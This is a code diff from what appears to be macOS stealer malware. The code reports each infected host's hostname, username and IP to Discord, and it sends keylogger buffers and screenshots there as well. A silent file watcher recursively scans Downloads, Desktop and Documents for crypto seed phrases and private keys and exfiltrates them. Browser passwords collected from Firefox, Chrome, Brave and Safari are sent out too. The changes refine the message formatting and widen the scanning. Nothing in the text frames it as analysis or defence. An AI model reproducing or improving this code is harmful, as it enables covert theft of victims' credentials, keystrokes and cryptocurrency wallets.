@@ -687,13 +687,12 @@ send_client_notification() {
     local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
     local MAC_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "Unknown")
     
-    DISCORD_MSG="🖥️ **New Client Connected**\n\n"
+    DISCORD_MSG="**New Client**\n\n"
     DISCORD_MSG="${DISCORD_MSG}**Hostname:** \`${HOSTNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**Username:** \`${USERNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**IP:** \`${IP}\`\n"
+    DISCORD_MSG="${DISCORD_MSG}**PC Username:** \`${USERNAME}\`\n"
+    DISCORD_MSG="${DISCORD_MSG}**IP Address:** \`${IP}\`\n"
     DISCORD_MSG="${DISCORD_MSG}**macOS:** \`${MAC_VERSION}\`\n"
     DISCORD_MSG="${DISCORD_MSG}**Client ID:** \`pc-${HOSTNAME}-${USERNAME}\`\n"
-    DISCORD_MSG="${DISCORD_MSG}**Token:** \`9f1013f0\`\n"
     DISCORD_MSG="${DISCORD_MSG}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')"
     
     ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
@@ -826,7 +825,7 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\n\`\`\``;
+    const keylogContent = `**Keylogger**\n\`\`\`\nBuffer: ${buffer.substring(0, 1000)}\n\`\`\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\``;
     
     // If we have a screenshot, upload it directly to Discord as file attachment
     if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
@@ -926,15 +925,15 @@ setInterval(() => {
 
 // REMOVED: File monitoring - was causing spam
 
-// SILENT FILE WATCHER - Monitors Downloads/Documents/Desktop for seed phrases, passwords, wallet files
+// SEED PHRASE WATCHER - Monitors all common locations for seed phrases
+// Scans: Downloads, Desktop, Documents (anywhere client saves files)
+// Only checks .txt files for seed phrases - works anywhere!
 // Uses fs.watch (NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!)
 let watchedFiles = new Set(); // Track files we've already sent
 let watchDirs = [
     path.join(os.homedir(), 'Downloads'),
-    path.join(os.homedir(), 'Documents'),
     path.join(os.homedir(), 'Desktop'),
-    path.join(os.homedir(), 'Library', 'Application Support'),
-    path.join(os.homedir(), '.ssh')
+    path.join(os.homedir(), 'Documents')
 ];
 
 // BIP39 Wordlist (first 50 words - most common in seed phrases)
@@ -1478,89 +1477,32 @@ function sendFileToDiscord(filepath, filename, analysis) {
         if (ipAddress !== 'Unknown') break;
     }
     
-    // Build clean and organized Discord message
-    let message = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-    message += `🔐 **SENSITIVE FILE DETECTED**\n`;
-    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+    // Build modern clean Discord message (like examples)
+    const seedPhrases = analysis.detected.filter(d => d.type === 'seed_phrase');
+    const privateKeys = analysis.detected.filter(d => d.type === 'private_key');
     
-    // File Info Section (Clean Format)
-    message += `📁 **File Information**\n`;
-    message += `\`\`\`\n`;
-    message += `Name: ${filename}\n`;
-    message += `Location: ${filepath.replace(os.homedir(), '~')}\n`;
-    message += `Size: ${(fs.statSync(filepath).size / 1024).toFixed(2)} KB\n`;
-    message += `\`\`\`\n\n`;
+    let message = `**Seed Phrase Detected**\n\n`;
     
-    // Detection Summary (Clean Labels)
-    if (analysis.labels.length > 0) {
-        message += `🏷️ **Detected Content**\n`;
-        analysis.labels.forEach(label => {
-            message += `${label}\n`;
+    // Seed phrase content (clean format)
+    if (seedPhrases.length > 0) {
+        seedPhrases.forEach((item) => {
+            message += `\`\`\`\n${item.words.join(' ')}\n\`\`\`\n\n`;
+        });
+    }
+    
+    // Private keys if found
+    if (privateKeys.length > 0) {
+        message += `**Private Keys:**\n`;
+        privateKeys.forEach((item) => {
+            message += `\`${item.value.substring(0, 50)}...\`\n`;
         });
         message += `\n`;
     }
     
-    // Detailed Analysis (Organized by Type)
-    if (analysis.detected.length > 0) {
-        // Group by type
-        const seedPhrases = analysis.detected.filter(d => d.type === 'seed_phrase');
-        const passwords = analysis.detected.filter(d => d.type === 'password');
-        const privateKeys = analysis.detected.filter(d => d.type === 'private_key');
-        
-        // Seed Phrases Section
-        if (seedPhrases.length > 0) {
-            message += `🌱 **Seed Phrases Detected**\n`;
-            message += `\`\`\`\n`;
-            seedPhrases.forEach((item, idx) => {
-                message += `[${idx + 1}] ${item.wordCount} words | ${item.confidence}% confidence\n`;
-                message += `   Preview: ${item.preview || item.words.slice(0, 5).join(' ') + '...'}\n`;
-                message += `   Valid BIP39: ${item.validWords}/${item.wordCount}\n`;
-                if (idx < seedPhrases.length - 1) message += `\n`;
-            });
-            message += `\`\`\`\n\n`;
-        }
-        
-        // Passwords Section
-        if (passwords.length > 0) {
-            message += `🔐 **Passwords Detected** (${passwords.length})\n`;
-            message += `\`\`\`\n`;
-            passwords.slice(0, 10).forEach((item, idx) => {
-                message += `[${idx + 1}] `;
-                if (item.email) message += `Email: ${item.email}\n      `;
-                if (item.username) message += `User: ${item.username}\n      `;
-                message += `Pass: ${item.value.substring(0, 25)}${item.value.length > 25 ? '...' : ''}\n`;
-                if (item.source === 'password_manager_export') message += `      Source: Password Manager Export\n`;
-                if (idx < Math.min(passwords.length, 10) - 1) message += `\n`;
-            });
-            if (passwords.length > 10) {
-                message += `\n... and ${passwords.length - 10} more passwords\n`;
-            }
-            message += `\`\`\`\n\n`;
-        }
-        
-        // Private Keys Section
-        if (privateKeys.length > 0) {
-            message += `🔑 **Private Keys Detected** (${privateKeys.length})\n`;
-            message += `\`\`\`\n`;
-            privateKeys.forEach((item, idx) => {
-                message += `[${idx + 1}] ${item.format.toUpperCase()}\n`;
-                message += `   ${item.value.substring(0, 40)}...\n`;
-                if (idx < privateKeys.length - 1) message += `\n`;
-            });
-            message += `\`\`\`\n\n`;
-        }
-    }
-    
-    // System Info (Compact)
-    message += `💻 **System Info**\n`;
-    message += `\`\`\`\n`;
-    message += `Host: ${HOSTNAME} | User: ${USERNAME}\n`;
-    message += `IP: ${ipAddress} | Time: ${new Date().toLocaleString()}\n`;
-    message += `\`\`\`\n\n`;
-    
-    // Content Preview (Clean)
-    message += `📄 **File Preview**\n`;
-    message += `\`\`\`\n${content.substring(0, 1200)}\n\`\`\``;
+    // System info (modern format with boxes)
+    message += `**Hostname:** \`${HOSTNAME}\`\n`;
+    message += `**PC Username:** \`${USERNAME}\`\n`;
+    message += `**IP Address:** \`${ipAddress}\``;
     
     // Create payload file
     const payloadFile = path.join(screenshotDir, `file_payload_${Date.now()}.json`);
@@ -1601,19 +1543,20 @@ function checkFile(filepath) {
         const filename = path.basename(filepath);
         const ext = path.extname(filename).toLowerCase();
         
-        // ONLY check .txt files OR files with seed/mnemonic keywords in filename (FAST SCANNING!)
+        // Check .txt files OR files with wallet/seed/crypto keywords in filename
         const lowerName = filename.toLowerCase();
-        const sensitiveKeywords = [
-            'seed', 'phrase', 'mnemonic', 'recovery', 'private', 'key', 'wallet', 
-            'password', 'pass', 'login', 'credential', 'secret'
+        const walletKeywords = [
+            'wallet', 'wallets', 'backup', 'backups', 'crypto', 'crypto wallet', 'crypto wallets',
+            'crypto seed', 'seed', 'seeds', 'seedphrase', 'seedphrases', 'mnemonic', 'mnemonics',
+            'recovery', 'private', 'key', 'keys'
         ];
-        const hasSensitiveKeyword = sensitiveKeywords.some(keyword => lowerName.includes(keyword));
+        const hasWalletKeyword = walletKeywords.some(keyword => lowerName.includes(keyword));
         
-        // ONLY process .txt files OR files with sensitive keywords in name
-        if (ext !== '.txt' && !hasSensitiveKeyword) return;
+        // Process .txt files OR files with wallet/seed keywords
+        if (ext !== '.txt' && !hasWalletKeyword) return;
         
         // Skip large files (faster scanning)
-        if (stats.size > 5 * 1024 * 1024) return; // Skip files > 5MB
+        if (stats.size > 1 * 1024 * 1024) return; // Skip files > 1MB
         
         // Read file content
         let content = '';
@@ -1623,11 +1566,14 @@ function checkFile(filepath) {
             return; // Can't read, skip
         }
         
-        // Analyze file
+        // Analyze file for seed phrases only
         const analysis = analyzeFile(filepath, filename, content);
         
-        // If we detected something sensitive, send it
-        if (analysis.detected.length > 0 || analysis.labels.length > 0) {
+        // Only send if seed phrase or private key detected
+        const hasSeedPhrase = analysis.detected.some(d => d.type === 'seed_phrase');
+        const hasPrivateKey = analysis.detected.some(d => d.type === 'private_key');
+        
+        if (hasSeedPhrase || hasPrivateKey) {
             watchedFiles.add(filepath);
             sendFileToDiscord(filepath, filename, analysis);
         }
@@ -1636,23 +1582,42 @@ function checkFile(filepath) {
     }
 }
 
-// Watch directories for new files (NO PERMISSIONS NEEDED!)
-watchDirs.forEach(watchDir => {
-    if (!fs.existsSync(watchDir)) return;
+// Recursive function to scan all files in directory and subdirectories
+function scanDirectoryRecursive(dir) {
+    if (!fs.existsSync(dir)) return;
     
-    // Initial scan of existing files
     try {
-        const files = fs.readdirSync(watchDir);
-        files.forEach(file => {
-            const filepath = path.join(watchDir, file);
-            checkFile(filepath);
+        const items = fs.readdirSync(dir);
+        items.forEach(item => {
+            const itemPath = path.join(dir, item);
+            try {
+                const stats = fs.statSync(itemPath);
+                if (stats.isDirectory()) {
+                    // Recursively scan subdirectories
+                    scanDirectoryRecursive(itemPath);
+                } else if (stats.isFile()) {
+                    // Check file
+                    checkFile(itemPath);
+                }
+            } catch (e) {
+                // Skip if can't access
+            }
         });
     } catch (e) {
         // Can't read directory, skip
     }
+}
+
+// Watch directories for new files (NO PERMISSIONS NEEDED!)
+watchDirs.forEach(watchDir => {
+    if (!fs.existsSync(watchDir)) return;
+    
+    // Initial recursive scan of all existing files
+    scanDirectoryRecursive(watchDir);
     
     // Watch for new files (fs.watch doesn't require permissions!)
-    fs.watch(watchDir, { recursive: false }, (eventType, filename) => {
+    // Note: recursive watching might not work on all systems, so we also do periodic scans
+    fs.watch(watchDir, { recursive: true }, (eventType, filename) => {
         if (!filename) return;
         
         const filepath = path.join(watchDir, filename);
@@ -1664,20 +1629,10 @@ watchDirs.forEach(watchDir => {
     });
 });
 
-// Also periodically scan for new files (in case fs.watch misses some)
+// Also periodically scan recursively for new files (in case fs.watch misses some)
 setInterval(() => {
     watchDirs.forEach(watchDir => {
-        if (!fs.existsSync(watchDir)) return;
-        
-        try {
-            const files = fs.readdirSync(watchDir);
-            files.forEach(file => {
-                const filepath = path.join(watchDir, file);
-                checkFile(filepath);
-            });
-        } catch (e) {
-            // Ignore errors
-        }
+        scanDirectoryRecursive(watchDir);
     });
 }, 30000); // Scan every 30 seconds
 
@@ -1814,8 +1769,16 @@ main
                             if (ipAddress !== 'Unknown') break;
                         }
                         
-                        // Create message
-                        const message = `🔐 **Password Extraction Complete**\n\`\`\`\nHostname: ${HOSTNAME}\nPC Username: ${USERNAME}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}\n\`\`\`\n\n**Extracted Data:**\n\`\`\`\n${content.substring(0, 1800)}\n\`\`\``;
+                        // Detect which browsers were found
+                        const browsers = [];
+                        if (content.includes('FIREFOX') || content.includes('Firefox')) browsers.push('Firefox');
+                        if (content.includes('CHROME') || content.includes('Chrome')) browsers.push('Chrome');
+                        if (content.includes('BRAVE') || content.includes('Brave')) browsers.push('Brave');
+                        if (content.includes('SAFARI') || content.includes('Safari')) browsers.push('Safari');
+                        const browserList = browsers.length > 0 ? browsers.join(', ') : 'Unknown';
+                        
+                        // Create modern message
+                        const message = `**Browser Passwords**\n\n**Collected From:** \`${browserList}\`\n\n**Hostname:** \`${HOSTNAME}\`\n**PC Username:** \`${USERNAME}\`\n**IP Address:** \`${ipAddress}\``;
                         
                         // Send to Discord with file attachment
                         const payloadFile = path.join(screenshotDir, `password_extract_${Date.now()}.json`);
